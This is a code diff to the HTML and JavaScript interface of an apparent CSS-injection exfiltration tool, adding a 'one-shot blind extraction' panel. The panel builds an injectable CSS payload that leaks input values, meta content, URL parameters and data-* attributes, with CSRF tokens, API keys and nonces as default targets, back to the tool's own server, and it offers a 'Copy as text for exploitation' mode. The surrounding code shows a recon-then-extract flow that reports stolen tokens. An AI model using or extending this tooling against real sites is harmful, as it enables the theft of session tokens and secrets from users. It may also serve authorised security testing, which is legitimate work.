@@ -254,6 +254,41 @@
   </div>
 
   <div class="panel blind-only hidden-mode">
+    <div class="panel-header">one-shot blind extraction</div>
+    <div class="targets">
+      <label><input type="checkbox" class="one-shot-target" value="input" checked> input[value]</label>
+      <label><input type="checkbox" class="one-shot-target" value="meta" checked> meta[content]</label>
+      <label><input type="checkbox" class="one-shot-target" value="url" checked> a[href] / form[action] params</label>
+      <label><input type="checkbox" class="one-shot-target" value="data" checked> data-* attributes</label>
+    </div>
+    <div class="config-row">
+      <span class="config-label">URL</span>
+      <select id="oneShotUrlCharset" class="config-input">
+        <option value="hex">hex</option><option value="alnum">alphanumeric</option>
+        <option value="base64">base64</option><option value="base64url">base64url</option>
+      </select>
+      <select id="oneShotUrlWindow" class="config-input short">
+        <option value="4">4 chars</option><option value="3">3 chars</option>
+      </select>
+    </div>
+    <div class="config-row">
+      <span class="config-label">data-*</span>
+      <input id="oneShotDataNames" class="config-input" value="data-csrf-token, data-token, data-api-key, data-nonce, data-key" aria-label="Data attribute names">
+    </div>
+    <div class="actions">
+      <select id="oneShotCopyMode" class="config-input" style="flex:none;width:220px">
+        <option value="test">Copy as HTML for test</option>
+        <option value="exploit">Copy as text for exploitation</option>
+      </select>
+      <button class="btn" id="oneShotCopyBtn">copy one-shot payload</button>
+      <span class="status" id="oneShotCopyStatus"></span>
+    </div>
+    <div class="note">Inject once. Whole values detect their charset automatically. URL params use the selected charset. Each kind shares one extraction lane, so two matching names of the same kind are reported as a collision. The full default payload is about 35 MB on localhost; select fewer targets to reduce it.</div>
+  </div>
+
+  <details class="blind-only hidden-mode">
+    <summary class="note" style="cursor:pointer;margin-bottom:12px">Advanced: separate discovery and extraction for multiple fields of the same kind</summary>
+  <div class="panel">
     <div class="panel-header">1. recon</div>
     <div class="targets">
       <label><input type="checkbox" class="target" value="input" checked> input[value]</label>
@@ -272,7 +307,7 @@
     <div class="note">Wordlist probes for field names, which element can host the requests, and which charset each value looks like. Inject it, then pick fields (and their charsets) below.</div>
   </div>
 
-  <div class="panel blind-only hidden-mode">
+  <div class="panel">
     <div class="panel-header"><span class="indicator" id="reconDot"></span>2. discovered fields</div>
     <div id="fieldList" class="token-box muted">waiting for recon...</div>
     <div class="note">Non-hex fields always use 3-char windows plus case pairs (~4–5 MB/field).</div>
@@ -289,6 +324,7 @@
       <span class="status" id="blindCopyStatus"></span>
     </div>
   </div>
+  </details>
 
   <div class="panel blind-only hidden-mode">
     <div class="panel-header">blind sample tokens</div>
@@ -296,7 +332,7 @@
   </div>
 
   <div class="panel blind-only hidden-mode">
-    <div class="panel-header"><span class="indicator" id="blindDot"></span>3. extracted tokens</div>
+    <div class="panel-header"><span class="indicator" id="blindDot"></span>extracted tokens</div>
     <div class="token-box muted" id="blindResults">waiting for extraction...</div>
     <div style="margin-top:12px" class="actions">
       <button class="btn btn-outline" id="blindRefreshBtn">refresh</button>
@@ -692,6 +728,11 @@ function renderResults(data) {
         r.candidates.map(escapeHtml).join('<br>');
     } else if (r.status === 'ok') {
       body = escapeHtml(r.token);
+    } else if (r.status === 'ambiguous_field') {
+      body = '<span style="color:#ff0">multiple names share this extraction lane: ' +
+        r.names.map(escapeHtml).join(', ') + '. Use the advanced flow for these fields.</span>';
+    } else if (r.status === 'unsupported') {
+      body = '<span style="color:#ff5555">value does not fit a supported charset</span>';
     } else if (r.status === 'failed') {
       const name = CHARSET_LABELS[r.charset] || 'hex';
       body = `<span style="color:#ff5555">no ${name} token recovered (value may not be purely ${name})</span>`;
@@ -711,6 +752,39 @@ function initBlind() {
   document.getElementById('blindSample').innerText = BLIND_SAMPLE.text;
   document.getElementById('modeTargeted').addEventListener('click', () => setMode('targeted'));
   document.getElementById('modeBlind').addEventListener('click', () => setMode('blind'));
+
+  document.getElementById('oneShotUrlCharset').addEventListener('change', e => {
+    const windowSelect = document.getElementById('oneShotUrlWindow');
+    const hex = e.target.value === 'hex';
+    windowSelect.querySelector('option[value="4"]').disabled = !hex;
+    if (!hex) windowSelect.value = '3';
+  });
+
+  document.getElementById('oneShotCopyBtn').addEventListener('click', async () => {
+    const status = document.getElementById('oneShotCopyStatus');
+    const cfg = {
+      targets: [...document.querySelectorAll('.one-shot-target:checked')].map(e => e.value),
+      dataNames: document.getElementById('oneShotDataNames').value.split(',').map(s => s.trim()).filter(Boolean),
+      urlCharset: document.getElementById('oneShotUrlCharset').value,
+      urlWindow: Number(document.getElementById('oneShotUrlWindow').value),
+    };
+    if (!cfg.targets.length) {
+      status.textContent = 'pick at least one target';
+      return;
+    }
+    status.textContent = 'building payload...';
+    const res = await fetch('/api/blind/one-shot', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(cfg),
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      status.textContent = data.error || 'failed';
+      return;
+    }
+    renderResults({ status: 'waiting' });
+    const css = FragBlind.generateOneShotCSS(data.fields, cfg, window.location.origin);
+    copyPayload(css, document.getElementById('oneShotCopyMode').value, status);
+  });
 
   document.getElementById('reconCopyBtn').addEventListener('click', () => {
     const targets = [...document.querySelectorAll('.target:checked')].map(e => e.value);
